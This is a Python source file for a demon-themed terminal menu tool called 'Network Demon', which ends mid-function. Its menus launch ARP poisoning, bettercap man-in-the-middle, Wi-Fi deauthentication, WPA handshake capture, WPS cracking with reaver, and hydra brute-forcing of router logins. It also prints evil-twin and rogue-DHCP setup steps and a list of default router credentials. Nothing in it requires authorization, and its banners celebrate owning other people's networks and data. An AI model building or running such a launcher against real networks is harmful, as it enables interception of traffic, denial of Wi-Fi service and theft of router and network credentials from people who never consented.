import time
import random
import sys
import os
import shutil
import subprocess
import threading
from datetime import datetime

RED = "\033[91m"
ORANGE = "\033[33m"
DARK_RED = "\033[31m"
YELLOW = "\033[93m"
RESET = "\033[0m"

PROXY_STATUS = "OFF"
TOR_STATUS = "OFF"
MAC_SPOOFED = False
NOTES_FILE = os.path.join(os.path.expanduser("~"), ".networkdemon_notes.txt")
LOG_FILE = os.path.join(os.path.expanduser("~"), ".networkdemon_log.txt")

DEMONIC_QUOTES = [
    "The network is the battlefield. You are the demon.",
    "Every packet is a prayer to the dark gods.",
    "They built the internet. We own it.",
    "In the darkness of the network, only demons survive.",
    "Control is an illusion. The network is real.",
    "We don't hack systems. We possess them.",
    "The firewall is just a door. Demons don't knock.",
    "Every port is a gateway to hell.",
    "They call it the dark web. We call it home.",
    "Your data belongs to the demon now.",
]

EXIT_QUOTES = [
    "The demon sleeps... but never forgets.",
    "Until next time, mortal. The network remembers.",
    "You may leave. The demon stays.",
    "The ritual is paused. Not ended.",
    "Darkness waits for your return.",
    "The demon watches even when you're gone.",
    "Every exit is just another entrance.",
    "The network never truly sleeps.",
]

IDLE_MESSAGES = [
    "...the demon grows impatient...",
    "...are you still there, mortal?...",
    "...the network stirs in your absence...",
    "...silence feeds the demon...",
    "...tick tock, the daemon watches...",
    "...your inactivity pleases no one...",
    "...the ritual must not be interrupted...",
    "...the demon whispers your name...",
]

DEVILS = [
    """
             ._                                            ,
             (`)..                                    ,.-')
              (',.)-..                            ,.-(..`)         
               (,.' ,.)-..                    ,.-(. `.. )                    
                (,.' ..' .)-..            ,.-( `.. `.. )                     
                 (,.' ,.'  ..')-.     ,.-( `. `.. `.. )                      
                  (,.'  ,.' ,.'  )-.-('   `. `.. `.. )                       
                   ( ,.' ,.'    _== ==_     `.. `.. )                        
                    ( ,.'   _==' ~  ~  `==_    `.. )                     
                     \\  _=='   ----..----  `==_   )                     
                  ,.-:    ,----___.  .___----.    -..                        
              ,.-'   (   _--====_  \\/  _====--_   )  `-..                 
          ,.-'   .__.'`.  `-_I0_-'    `-_0I_-'  .'`.__.  `-..     
      ,.-'.'   .'      (          |  |          )      `.   `.-..  
  ,.-'    :    `___--- '`.__.    / __ \\    .__.' `---___'    :   `-..      
-'_________`-____________'__ \\  (O)  (O)  / __`____________-'________`-     
                            \\ . _  __  _ . /                               
                             \\ `V-'  `-V' |                                 
                              | \\ \\ | /  /                                 
                               V \\ ~| ~/V                                   
                                |  \\  /|                                    
                                 \\~ | V             - JGG                     
                                  \\  |                                        
                                   VV
""",
    """
                            ,-.
       ___,---.__          /'|`\\          __,---,___
    ,-'    \\`    `-.____,-'  |  `-.____,-'    //    `-.
  ,'        |           ~'\\     /`~           |        `.
 /      ___//              `. ,'          ,  , \\___      \\
|    ,-'   `-.__   _         |        ,    __,-'   `-.    |
|   /          /\\_  `   .    |    ,      _/\\          \\   |
\\  |           \\ \\`-.___ \\   |   / ___,-'/ /           |  /
 \\  \\           | `._   `\\\\  |  //'   _,' |           /  /
  `-.\\         /'  _ `---'' , . ``---' _  `\\         /,-'
     ``       /     \\    ,='/ \\`=.    /     \\       ''
             |__   /|\\_,--.,-.--,--._/|\\   __|
             /  `./  \\\\`\\ |  |  | /,//' \\,'  \\
eViL        /   /     ||--+--|--+-/-|     \\   \\
           |   |     /'\\_ \\_\\ | /_/_/`\\     |   |
            \\   \\__, \\_     `~'     _/ .__/   /
             `-._,-'   `-._______,-'   `-._,-'
""",
    """
 .-._                                                   _,-,
  `._`-._                                           _,-'_,'
     `._ `-._                                   _,-' _,'
        `._  `-._        __.-----.__        _,-'  _,'
           `._   `#==='''           '''===#'   _,'
              `._/)  ._               _.  (\\_,'
               )*'     **.__     __.**     '*( 
               #  .==..__  ''   ''  __..==,  # 
Deelkar        #   `'._(_).       .(_)_.'   #
""",
    """
   , ,, ,                              
   | || |    ,/  _____  \\.             
   \\_||_/   ||_/     \\_||             
     ||      \\_| . . |_/              
     ||         |  L  |                
    ,||         |`==='|                
    |>|      ___`>  -<'___             
    |>|\\    /             \\            
    \\>| \\  /  ,    .    .  |           
     ||  \\/  /| .  |  . |  |           
     ||\\  ` / | ___|___ |  |     (     
  (( || `--'  | _______ |  |     ))  ( 
(  )\\|| (  )\\ | - --- - | -| (  ( \\  ))
(\\/  || ))/ ( | -- - -- |  | )) )  \\(( 
 ( ()||((( ())|         |  |( (( () )
""",
    """
  .:'                                  `:.
 ::'                                    `::
:: :.                                  .: ::
 `:. `:.             .             .:'  .:'
   `::. `::          !           ::' .::'
      `::.`::.    .' ! `.    .::'.::'
        `:.  `::::'':!:``::::'   ::'
        :'*:::.  .:' ! `:.  .:::*`:
       :: HHH::.   ` ! '   .::HHH ::
      ::: `H TH::.  `!'  .::HT H' :::
      ::..  `THHH:`:   :':HHHT'  ..::
      `::      `T: `. .' :T'      ::'
        `:. .   :         :   . .:'
          `::'               `::'
            :'  .`.  .  .'.  `:
            :' ::.       .:: `:
            :' `:::     :::' `:
             `.  ``     ''  .'
              :`...........':
              ` :`.     .': '
               `:  `'''  :
""",
]

banner = [
    "███╗   ██╗███████╗████████╗██╗    ██╗ ██████╗ ██████╗ ██╗  ██╗",
    "████╗  ██║██╔════╝╚══██╔══╝██║    ██║██╔═══██╗██╔══██╗██║ ██╔╝",
    "██╔██╗ ██║█████╗     ██║   ██║ █╗ ██║██║   ██║██████╔╝█████╔╝ ",
    "██║╚██╗██║██╔══╝     ██║   ██║███╗██║██║   ██║██╔══██╗██╔═██╗ ",
    "██║ ╚████║███████╗   ██║   ╚███╔███╔╝╚██████╔╝██║  ██║██║  ██╗",
    "╚═╝  ╚═══╝╚══════╝   ╚═╝    ╚══╝╚══╝  ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝",
    "",
    "    ██████╗ ███████╗███╗   ███╗ ██████╗ ███╗   ██╗",
    "    ██╔══██╗██╔════╝████╗ ████║██╔═══██╗████╗  ██║",
    "    ██║  ██║█████╗  ██╔████╔██║██║   ██║██╔██╗ ██║",
    "    ██║  ██║██╔══╝  ██║╚██╔╝██║██║   ██║██║╚██╗██║",
    "    ██████╔╝███████╗██║ ╚═╝ ██║╚██████╔╝██║ ╚████║",
    "    ╚═════╝ ╚══════╝╚═╝     ╚═╝ ╚═════╝ ╚═╝  ╚═══╝",
]

fire_chars = ["▲", "△", "↑", "¡", "!", "|", "╵", "╷"]
fire_colours = [YELLOW, ORANGE, RED, DARK_RED]
idle_timer = None
current_prompt = ""


def log_tool(tool_name):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write(f"[{timestamp}] - {tool_name}\n")


def print_fire_row(width):
    row = ""
    for _ in range(width):
        colour = random.choice(fire_colours)
        char = random.choice(fire_chars)
        if random.random() < 0.3:
            char = " "
        row += f"{colour}{char}{RESET}"
    print(row)


def animate_banner():
    for _ in range(15):
        print("\033[2J\033[H", end="")
        for _ in range(3):
            print_fire_row(65)
        for line in banner:
            colour = random.choice([RED, DARK_RED, ORANGE])
            print(f"{colour}{line}{RESET}")
        for _ in range(3):
            print_fire_row(65)
        print(f"\n{ORANGE}    666 - You have entered the demon network 666{RESET}")
        print(f"{DARK_RED}    The network bleeds. All systems will fall.{RESET}")
        time.sleep(0.15)
    print("\033[2J\033[H", end="")
    for line in banner:
        print(f"{DARK_RED}{line}{RESET}")
    print(f"\n{ORANGE}    666 - You have entered the demon network 666{RESET}")
    print(f"{DARK_RED}    The network bleeds. All systems will fall.{RESET}")


def flash_submenu():
    print("\033[2J\033[H", end="")
    devil = random.choice(DEVILS)
    print(f"{DARK_RED}{devil}{RESET}")
    time.sleep(1.5)
    print("\033[2J\033[H", end="")


def type_out(text, colour, delay=0.05):
    for char in text:
        print(f"{colour}{char}{RESET}", end="", flush=True)
        time.sleep(delay)
    print()


def pause():
    """Hold the current output on screen until the user acknowledges it.

    Every menu loop redraws the banner/menu immediately on the next
    iteration, which would otherwise scroll freshly printed results off
    screen before they can be read.
    """
    try:
        input(f"\n{ORANGE}    ⛧ Press Enter to continue ⛧{RESET}")
    except EOFError:
        pass


def perish_in_fire():
    start = time.time()
    while time.time() - start < 3:
        print("\033[2J\033[H", end="")
        for _ in range(20):
            print_fire_row(65)
        time.sleep(0.12)
    print("\033[2J\033[H", end="")
    type_out("    YOU SHALL PERISH IN FIRE", ORANGE, delay=0.08)
    time.sleep(2)
    sys.exit(0)


def show_idle_message():
    message = random.choice(IDLE_MESSAGES)
    # Reprint the prompt afterwards so the nag doesn't orphan the input line.
    print(f"\n{DARK_RED}{message}{RESET}\n{current_prompt}", end="", flush=True)


def reset_idle_timer():
    global idle_timer
    if idle_timer is not None:
        idle_timer.cancel()
    idle_timer = threading.Timer(30.0, show_idle_message)
    idle_timer.daemon = True
    idle_timer.start()


def stop_idle_timer():
    global idle_timer
    if idle_timer is not None:
        idle_timer.cancel()
        idle_timer = None


def demon_input(prompt):
    """Prompt for input with the idle nagger armed around it.

    Stores the prompt so the idle message can redraw it, and always
    disarms the timer afterwards.
    """
    global current_prompt
    current_prompt = prompt
    reset_idle_timer()
    try:
        return input(prompt)
    finally:
        stop_idle_timer()


def symbol():
    return f"{ORANGE}⛧{RESET}"


def get_local_ip():
    try:
        result = subprocess.run(["hostname", "-I"], capture_output=True, text=True, check=False)
        ips = [ip.strip() for ip in result.stdout.split() if ip.strip()]
        return ips[0] if ips else "Unknown"
    except Exception:
        return "Unknown"


def get_local_mac():
    try:
        for name in os.listdir("/sys/class/net"):
            if name == "lo" or name.startswith("docker"):
                continue
            with open(f"/sys/class/net/{name}/address", "r", encoding="utf-8") as f:
                mac = f.read().strip()
                if mac:
                    return mac
    except Exception:
        pass
    return "Unknown"


def get_wifi_interface():
    try:
        if shutil.which("iw"):
            result = subprocess.run(["iw", "dev"], capture_output=True, text=True, check=False)
            for line in result.stdout.splitlines():
                if line.strip().startswith("Interface"):
                    return line.split()[-1]
        for name in os.listdir("/sys/class/net"):
            if name == "lo" or name.startswith("docker"):
                continue
            if any(t in name for t in ["wlan", "wlp", "wifi", "wl"]):
                return name
    except Exception:
        pass
    return "wlan0"


def show_demon_signal():
    ip = get_local_ip()
    mac = "SPOOFED" if MAC_SPOOFED else get_local_mac()
    tor = "████" if TOR_STATUS == "ON" else "OFF"
    proxy = "████" if PROXY_STATUS == "ON" else "OFF"
    signal_bar = f"{ORANGE}▓▓▓▓▓▓▓▓░░{RESET}"
    print(f"\n{DARK_RED}⛧ DEMON SIGNAL ⛧{RESET}")
    print(f"{signal_bar} {RED}IP:{RESET} {ip}")
    print(f"{RED}MAC:{RESET} {mac}   {RED}TOR:{RESET} {tor}   {RED}PROXY:{RESET} {proxy}")


def ritual_login():
    time.sleep(1)
    quote = random.choice(DEMONIC_QUOTES)
    type_out(f"\n    {quote}", DARK_RED, delay=0.04)
    time.sleep(1)
    print(f"\n{DARK_RED}    The demon stirs...{RESET}")
    time.sleep(1.5)
    print(f"\n{ORANGE}    What is your name, mortal?{RESET}")
    name = input(f"{RED}    > {RESET}").strip()
    if not name:
        name = "stranger"
    time.sleep(0.8)
    type_out(f"\n    Hello {name}...", DARK_RED, delay=0.07)
    time.sleep(0.5)
    type_out("    We have been waiting for you.", ORANGE, delay=0.05)
    time.sleep(0.8)
    type_out("    Are you ready to dance with the devil?", RED, delay=0.05)
    print()
    answer = input(f"{DARK_RED}    [yes/no] > {RESET}").strip().lower()
    if answer == "yes":
        time.sleep(0.5)
        type_out(f"\n    Then let the ritual begin, {name}...", ORANGE, delay=0.06)
        time.sleep(1)
        print(f"\n{RED}    Welcome to Network Demon.{RESET}")
        time.sleep(1)
        return name
    else:
        time.sleep(0.5)
        type_out("\n    Then you shall perish in fire...", DARK_RED, delay=0.07)
        time.sleep(0.8)
        perish_in_fire()


def save_note():
    print(f"\n{DARK_RED}⛧ Save a note ⛧{RESET}")
    title = input(f"{ORANGE}Title: {RESET}").strip()
    note = input(f"{ORANGE}Note: {RESET}").strip()
    if not title and not note:
        print(f"{RED}Empty note not saved.{RESET}")
        return
    with open(NOTES_FILE, "a", encoding="utf-8") as f:
        f.write(f"{title or 'Untitled'}|{note}\n")
    print(f"{ORANGE}Note saved.{RESET}")


def view_notes():
    if not os.path.exists(NOTES_FILE):
        print(f"{RED}No notes found.{RESET}")
        return
    with open(NOTES_FILE, "r", encoding="utf-8") as f:
        lines = [line.rstrip() for line in f if line.strip()]
    if not lines:
        print(f"{RED}No notes found.{RESET}")
        return
    print(f"\n{DARK_RED}⛧ NOTES ⛧{RESET}")
    for idx, line in enumerate(lines, start=1):
        parts = line.split("|", 1)
        title = parts[0]
        note = parts[1] if len(parts) > 1 else ""
        print(f"{symbol()} {ORANGE}{idx}. {title}{RESET}")
        if note:
            print(f"{RED}    {note}{RESET}")


def delete_note():
    if not os.path.exists(NOTES_FILE):
        print(f"{RED}No notes to delete.{RESET}")
        return
    with open(NOTES_FILE, "r", encoding="utf-8") as f:
        entries = [line.rstrip("\n") for line in f if line.strip()]
    if not entries:
        print(f"{RED}No notes to delete.{RESET}")
        return
    view_notes()
    try:
        choice = int(input(f"{ORANGE}Delete note number: {RESET}").strip())
    except ValueError:
        print(f"{RED}Invalid selection.{RESET}")
        return
    if choice < 1 or choice > len(entries):
        print(f"{RED}Number out of range.{RESET}")
        return
    entries.pop(choice - 1)
    with open(NOTES_FILE, "w", encoding="utf-8") as f:
        if entries:
            f.write("\n".join(entries) + "\n")
    print(f"{ORANGE}Note deleted.{RESET}")


def show_notes_menu():
    first = True
    while True:
        if not first:
            pause()
        first = False
        show_demon_signal()
        print(f"\n{DARK_RED}⛧═══════ NOTES ═══════⛧{RESET}")
        print(f"{symbol()} 1 {symbol()} Save note")
        print(f"{symbol()} 2 {symbol()} View notes")
        print(f"{symbol()} 3 {symbol()} Delete note")
        print(f"{symbol()} 4 {symbol()} Back")
        print(f"{DARK_RED}⛧═══════════════════⛧{RESET}")
        choice = demon_input(f"{RED}⛧ > {RESET}").strip()
        if choice == "1":
            save_note()
        elif choice == "2":
            view_notes()
        elif choice == "3":
            delete_note()
        elif choice == "4":
            return
        else:
            print(f"{RED}Invalid option.{RESET}")


def show_network_attacks():
    first = True
    while True:
        if not first:
            pause()
        first = False
        show_demon_signal()
        print(f"\n{DARK_RED}⛧═══════ NETWORK ATTACKS ═══════⛧{RESET}")
        print(f"{symbol()} 1 {symbol()} ARP Poisoning")
        print(f"{symbol()} 2 {symbol()} DNS Spoofing")
        print(f"{symbol()} 3 {symbol()} Man in the Middle")
        print(f"{symbol()} 4 {symbol()} Rogue DHCP")
        print(f"{symbol()} 5 {symbol()} Network Traffic Analyser")
        print(f"{symbol()} 6 {symbol()} Back")
        print(f"{DARK_RED}⛧═══════════════════════════════⛧{RESET}")
        choice = demon_input(f"{RED}⛧ > {RESET}").strip()

        if choice == "1":
            log_tool("ARP Poisoning")
            if not shutil.which("arpspoof"):
                print(f"{RED}arpspoof not installed. Install with: sudo apt install dsniff{RESET}")
                continue
            iface = input(f"{ORANGE}Interface: {RESET}").strip()
            target = input(f"{ORANGE}Target IP: {RESET}").strip()
            gateway = input(f"{ORANGE}Gateway IP: {RESET}").strip()
            if iface and target and gateway:
                print(f"{DARK_RED}Starting ARP poisoning...{RESET}")
                subprocess.run(["arpspoof", "-i", iface, "-t", target, gateway], check=False)
            else:
                print(f"{RED}Missing required fields.{RESET}")

        elif choice == "2":
            log_tool("DNS Spoofing")
            print(f"{ORANGE}DNS Spoofing requires dnsspoof and a hosts file.{RESET}")
            print(f"{ORANGE}Install with: sudo apt install dsniff{RESET}")
            print(f"{ORANGE}Usage: sudo dnsspoof -i <interface> -f /etc/hosts{RESET}")

        elif choice == "3":
            log_tool("Man in the Middle")
            if shutil.which("bettercap"):
                print(f"{DARK_RED}Launching Bettercap...{RESET}")
                subprocess.run(["bettercap"], check=False)
            else:
                print(f"{RED}Bettercap not installed. Install with: sudo apt install bettercap{RESET}")

        elif choice == "4":
            log_tool("Rogue DHCP")
            print(f"{ORANGE}Rogue DHCP Setup Instructions:{RESET}")
            print(f"{RED}1. Install: sudo apt install isc-dhcp-server{RESET}")
            print(f"{RED}2. Configure /etc/dhcp/dhcpd.conf with your range{RESET}")
            print(f"{RED}3. Run: sudo systemctl start isc-dhcp-server{RESET}")

        elif choice == "5":
            log_tool("Network Traffic Analyser")
            iface = input(f"{ORANGE}Interface (leave blank for any): {RESET}").strip() or "any"
            filt = input(f"{ORANGE}Filter (e.g. tcp, http, leave blank for all): {RESET}").strip()
            if shutil.which("tshark"):
                cmd = ["tshark", "-i", iface]
                if filt:
                    cmd += ["-f", filt]
                subprocess.run(cmd, check=False)
            else:
                print(f"{RED}tshark not installed. Install with: sudo apt install tshark{RESET}")

        elif choice == "6":
            return
        else:
            print(f"{RED}Invalid option.{RESET}")


def show_wireless_hacking():
    first = True
    while True:
        if not first:
            pause()
        first = False
        show_demon_signal()
        print(f"\n{DARK_RED}⛧═══════ WIRELESS HACKING ═══════⛧{RESET}")
        print(f"{symbol()} 1 {symbol()} WiFi Scanner")
        print(f"{symbol()} 2 {symbol()} Deauth Attack")
        print(f"{symbol()} 3 {symbol()} WPA Handshake Capture")
        print(f"{symbol()} 4 {symbol()} Evil Twin")
        print(f"{symbol()} 5 {symbol()} WPS Attack")
        print(f"{symbol()} 6 {symbol()} Bluetooth Scanner")
        print(f"{symbol()} 7 {symbol()} Wifite")
        print(f"{symbol()} 8 {symbol()} Bettercap")
        print(f"{symbol()} 9 {symbol()} Back")
        print(f"{DARK_RED}⛧════════════════════════════════⛧{RESET}")
        choice = demon_input(f"{RED}⛧ > {RESET}").strip()

        if choice == "1":
            log_tool("WiFi Scanner")
            iface = get_wifi_interface()
            print(f"{DARK_RED}Scanning on {iface}...{RESET}")
            result = subprocess.run(["iwlist", iface, "scan"], capture_output=True, text=True, check=False)
            print(result.stdout or result.stderr or f"{RED}No results.{RESET}")

        elif choice == "2":
            log_tool("Deauth Attack")
            if not shutil.which("aireplay-ng"):
                print(f"{RED}aireplay-ng not installed. Install with: sudo apt install aircrack-ng{RESET}")
                continue
            iface = input(f"{ORANGE}Interface (monitor mode): {RESET}").strip()
            bssid = input(f"{ORANGE}Target BSSID: {RESET}").strip()
            client = input(f"{ORANGE}Client MAC (leave blank for broadcast): {RESET}").strip()
            if iface and bssid:
                cmd = ["aireplay-ng", "--deauth", "0", "-a", bssid, iface]
                if client:
                    cmd += ["-c", client]
                print(f"{DARK_RED}Launching deauth attack...{RESET}")
                subprocess.run(cmd, check=False)
            else:
                print(f"{RED}Interface and BSSID required.{RESET}")

        elif choice == "3":
            log_tool("WPA Handshake Capture")
            if not shutil.which("airodump-ng"):
                print(f"{RED}airodump-ng not installed. Install with: sudo apt install aircrack-ng{RESET}")
                continue
            iface = input(f"{ORANGE}Interface (monitor mode): {RESET}").strip()
            channel = input(f"{ORANGE}Channel: {RESET}").strip()
            bssid = input(f"{ORANGE}Target BSSID: {RESET}").strip()
            output = input(f"{ORANGE}Output file name: {RESET}").strip() or "capture"
            if iface:
                cmd = ["airodump-ng"]
                if channel:
                    cmd += ["-c", channel]
                if bssid:
                    cmd += ["--bssid", bssid]
                cmd += ["-w", output, iface]
                print(f"{DARK_RED}Capturing handshake...{RESET}")
                subprocess.run(cmd, check=False)
            else:
                print(f"{RED}Interface required.{RESET}")

        elif choice == "4":
            log_tool("Evil Twin")
            print(f"{ORANGE}Evil Twin Setup Instructions:{RESET}")
            print(f"{RED}1. Install: sudo apt install hostapd dnsmasq{RESET}")
            print(f"{RED}2. Set interface to monitor mode: sudo airmon-ng start wlan0{RESET}")
            print(f"{RED}3. Configure hostapd.conf with target SSID{RESET}")
            print(f"{RED}4. Run: sudo hostapd hostapd.conf{RESET}")
            print(f"{RED}5. Configure dnsmasq for DHCP on the fake AP{RESET}")

        elif choice == "5":
            log_tool("WPS Attack")
            if not shutil.which("reaver"):
                print(f"{RED}Reaver not installed. Install with: sudo apt install reaver{RESET}")
                continue
            iface = input(f"{ORANGE}Interface (monitor mode): {RESET}").strip()
            bssid = input(f"{ORANGE}Target BSSID: {RESET}").strip()
            if iface and bssid:
                print(f"{DARK_RED}Launching WPS attack...{RESET}")
                subprocess.run(["reaver", "-i", iface, "-b", bssid, "-vv"], check=False)
            else:
                print(f"{RED}Interface and BSSID required.{RESET}")

        elif choice == "6":
            log_tool("Bluetooth Scanner")
            if shutil.which("bluetoothctl"):
                print(f"{DARK_RED}Scanning for Bluetooth devices...{RESET}")
                subprocess.run(["bluetoothctl", "scan", "on"], check=False)
            else:
                print(f"{RED}bluetoothctl not found. Install with: sudo apt install bluez{RESET}")

        elif choice == "7":
            log_tool("Wifite")
            if shutil.which("wifite"):
                subprocess.run(["wifite"], check=False)
            else:
                print(f"{RED}Wifite not installed. Install with: sudo apt install wifite{RESET}")

        elif choice == "8":
            log_tool("Bettercap")
            if shutil.which("bettercap"):
                subprocess.run(["bettercap"], check=False)
            else:
                print(f"{RED}Bettercap not installed. Install with: sudo apt install bettercap{RESET}")

        elif choice == "9":
            return
        else:
            print(f"{RED}Invalid option.{RESET}")


def show_device_discovery():
    first = True
    while True:
        if not first:
            pause()
        first = False
        show_demon_signal()
        print(f"\n{DARK_RED}⛧═══════ DEVICE DISCOVERY ═══════⛧{RESET}")
        print(f"{symbol()} 1 {symbol()} OS Fingerprinting")
        print(f"{symbol()} 2 {symbol()} Service Enumeration")
        print(f"{symbol()} 3 {symbol()} Vulnerability Scanner")
        print(f"{symbol()} 4 {symbol()} Default Credentials Checker")
        print(f"{symbol()} 5 {symbol()} Back")
        print(f"{DARK_RED}⛧═════════════════════════════════⛧{RESET}")
        choice = demon_input(f"{RED}⛧ > {RESET}").strip()

        if choice == "1":
            log_tool("OS Fingerprinting")
            target = input(f"{ORANGE}Target IP or range: {RESET}").strip()
            if target and shutil.which("nmap"):
                subprocess.run(["nmap", "-O", "-T4", target], check=False)
            else:
                print(f"{RED}Target required or nmap not installed.{RESET}")

        elif choice == "2":
            log_tool("Service Enumeration")
            target = input(f"{ORANGE}Target IP or range: {RESET}").strip()
            if target and shutil.which("nmap"):
                subprocess.run(["nmap", "-sV", "-T4", target], check=False)
            else:
                print(f"{RED}Target required or nmap not installed.{RESET}")

        elif choice == "3":
            log_tool("Vulnerability Scanner")
            target = input(f"{ORANGE}Target IP or range: {RESET}").strip()
            if target and shutil.which("nmap"):
                subprocess.run(["nmap", "--script", "vuln", target], check=False)
            else:
                print(f"{RED}Target required or nmap not installed.{RESET}")

        elif choice == "4":
            log_tool("Default Credentials Checker")
            print(f"\n{DARK_RED}⛧ Common Default Credentials ⛧{RESET}")
            creds = [
                ("Router/Gateway", "admin", "admin"),
                ("Router/Gateway", "admin", "password"),
                ("Router/Gateway", "admin", "1234"),
                ("Router/Gateway", "root", "root"),
                ("Router/Gateway", "admin", ""),
                ("Cisco", "cisco", "cisco"),
                ("Netgear", "admin", "password"),
                ("TP-Link", "admin", "admin"),
                ("BT Hub", "admin", "admin"),
                ("Sky Router", "admin", "sky"),
                ("Virgin Media", "admin", "changeme"),
            ]
            for device, user, passwd in creds:
                print(f"{ORANGE}{device}{RESET} - {RED}user:{RESET} {user} {RED}pass:{RESET} {passwd or '(blank)'}")

        elif choice == "5":
            return
        else:
            print(f"{RED}Invalid option.{RESET}")


def show_router_attacks():
    first = True
    while True:
        if not first:
            pause()
        first = False
        show_demon_signal()
        print(f"\n{DARK_RED}⛧═══════ ROUTER ATTACKS ═══════⛧{RESET}")
        print(f"{symbol()} 1 {symbol()} Router Login Brute Forcer")
        print(f"{symbol()} 2 {symbol()} WPS Attack")
        print(f"{symbol()} 3 {symbol()} Router Vulnerability Scanner")
        print(f"{symbol()} 4 {symbol()} Default Credential Checker")
        print(f"{symbol()} 5 {symbol()} Back")
        print(f"{DARK_RED}⛧═══════════════════════════════⛧{RESET}")
        choice = demon_input(f"{RED}⛧ > {RESET}").strip()

        if choice == "1":
            log_tool("Router Login Brute Forcer")
            if not shutil.which("hydra"):
                print(f"{RED}Hydra not installed. Install with: sudo apt install hydra{RESET}")
                continue
            target = input(f"{ORANGE}Router IP (default 192.168.1.1): {RESET}").strip() or "192.168.1.1"
            username = input(f"{ORANGE}Username (default admin): {RESET}").strip() or "admin"
            wordlist = input(f"{ORANGE}Wordlist path: {RESET}").strip()
            if wordlist and os.path.exists(wordlist):
                print(f"{ORANGE}Note:{RESET} this uses Hydra's http-get module, which only tests HTTP")
                print(f"{ORANGE}Basic/Digest auth popups. Most consumer routers use a form-based web{RESET}")
                print(f"{ORANGE}login instead, which this will NOT detect even if a password is correct.{RESET}")
                print(f"{ORANGE}For form-based logins, use Hydra's http-post-form module with the{RESET}")
                print(f"{ORANGE}exact field names from that router's login page.{RESET}")
                subprocess.run(["hydra", "-l", username, "-P", wordlist, target, "http-get", "/"], check=False)
            else:
                print(f"{RED}Wordlist not found.{RESET}")

        elif choice == "2":
            log_tool("WPS Attack Router")
            if not shutil.which("reaver"):
                print(f"{RED}Reaver not installed. Install with: sudo apt install reaver{RESET}")
                continue
            iface = input(f"{ORANGE}Interface (monitor mode): {RESET}").strip()
            bssid = input(f"{ORANGE}Router BSSID: {RESET}").strip()
            if iface and bssid:
                subprocess.run(["reaver", "-i", iface, "-b", bssid, "-vv"], check=False)
            else:
                print(f"{RED}Interface and BSSID required.{RESET}")

        elif choice == "3":
            log_tool("Router Vulnerability Scanner")
            target = input(f"{ORANGE}Router IP (default 192.168.1.1): {RESET}").strip() or "192.168.1.1"
            if shutil.which("nmap"):
                print(f"{DARK_RED}Scanning router for vulnerabilities...{RESET}")
                subprocess.run(["nmap", "--script", "http-auth,http-default-accounts,vuln", target], check=False)
            else:
                print(f"{RED}nmap not installed.{RESET}")

        elif choice == "4":
            log_tool("Router Default Credentials")
            gateway = input(f"{ORANGE}Router IP (default 192.168.1.1): {RESET}").strip() or "192.168.1.1"
            if not shutil.which("hydra"):
                print(f"{RED}Hydra not installed.{RESET}")
                continue
            print(f"{ORANGE}Note:{RESET} this uses Hydra's http-get module, which only tests HTTP")
            print(f"{ORANGE}Basic/Digest auth popups. Most consumer routers (including the brands{RESET}")
            print(f"{ORANGE}listed in Device Discovery) use a form-based web login instead, which{RESET}")
            print(f"{ORANGE}this will NOT detect even if a default password is correct.{RESET}")
            print(f"{DARK_RED}Testing default credentials against {gateway}...{RESET}")
            default_creds = [("admin", "admin"), ("admin", "password"), ("admin", "1234"), ("root", "root"), ("admin", "")]
            for user, passwd in default_creds:
                cmd = ["hydra", "-l", user, "-p", passwd, gateway, "http-get", "/"]
                result = subprocess.run(cmd, capture_output=True, text=True, check=False)
                # Hydra prints the hit as a single line containing host:, login:
                # and password: together; match that rather than loose substrings.
                lines = ((result.stdout or "") + (result.stderr or "")).lower().splitlines()
                found = any(
                    "host:" in line and "login:" in line and "password:" in line
                    for line in lines
                )
                shown = passwd or "(blank)"
                if found:
                    print(f"{ORANGE}Found: {user}:{shown}{RESET}")
                else:
                    print(f"{RED}Failed: {user}:{shown}{RESET}")

        elif choice == "5":
            return
        else:
            print(f"{RED}Invalid option.{RESET}")


def show_traffic_analysis():
    first = True
    while True:
        if not first:
            pause()
        first = False
        show_demon_signal()
        print(f"\n{DARK_RED}⛧═══════ TRAFFIC ANALYSIS ═══════⛧{RESET}")
        print(f"{symbol()} 1 {symbol()} Packet Capture")
        print(f"{symbol()} 2 {symbol()} Live Traffic Monitor")
        print(f"{symbol()} 3 {symbol()} HTTP Traffic Inspector")
        print(f"{symbol()} 4 {symbol()} DNS Query Monitor")
        print(f"{symbol()} 5 {symbol()} Back")
        print(f"{DARK_RED}⛧══════════════════════════════════⛧{RESET}")
        choice = demon_input(f"{RED}⛧ > {RESET}").strip()

        if choice == "1":
            log_tool("Packet Capture")
            if not shutil.which("tshark") and not shutil.which("tcpdump"):
                print(f"{RED}No capture tool found. Install tshark: sudo apt install tshark{RESET}")
                continue
            try:
                mins = int(input(f"{ORANGE}Capture duration in minutes: {RESET}").strip())
            except ValueError:
                print(f"{RED}Invalid duration.{RESET}")
                continue
            iface = input(f"{ORANGE}Interface (leave blank for any): {RESET}").strip() or "any"
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            outfile = os.path.join(os.path.expanduser("~"), f"demon_capture_{timestamp}.pcap")
            secs = mins * 60
            if shutil.which("tshark"):
                cmd = ["timeout", str(secs), "tshark", "-i", iface, "-w", outfile]
            else:
                cmd = ["timeout", str(secs), "tcpdump", "-i", iface, "-w", outfile]
            print(f"{DARK_RED}Capturing for {mins} minute(s)...{RESET}")
            subprocess.run(cmd, check=False)
            if os.path.exists(outfile):
                print(f"{ORANGE}Saved to: {outfile}{RESET}")
                keep = input(f"{ORANGE}Keep or delete? (keep/delete): {RESET}").strip().lower()
                if keep == "delete":
                    os.remove(outfile)
                    print(f"{RED}Deleted.{RESET}")

        elif choice == "2":
            log_tool("Live Traffic Monitor")
            iface = input(f"{ORANGE}Interface (leave blank for any): {RESET}").strip() or "any"
            if shutil.which("tshark"):
                subprocess.run(["tshark", "-i", iface], check=False)
            else:
                print(f"{RED}tshark not installed.{RESET}")

        elif choice == "3":
            log_tool("HTTP Traffic Inspector")
            iface = input(f"{ORANGE}Interface (leave blank for any): {RESET}").strip() or "any"
            if shutil.which("tshark"):
                subprocess.run(["tshark", "-i", iface, "-f", "tcp port 80", "-Y", "http"], check=False)
            else:
                print(f"{RED}tshark not installed.{RESET}")

        elif choice == "4":
            log_tool("DNS Query Monitor")
            iface = input(f"{ORANGE}Interface (leave blank for any): {RESET}").strip() or "any"
            if shutil.which("tshark"):
                subprocess.run(["tshark", "-i", iface, "-f", "udp port 53"], check=False)
            else:
                print(f"{RED}tshark not installed.{RESET}")

        elif choice == "5":
            return
        else:
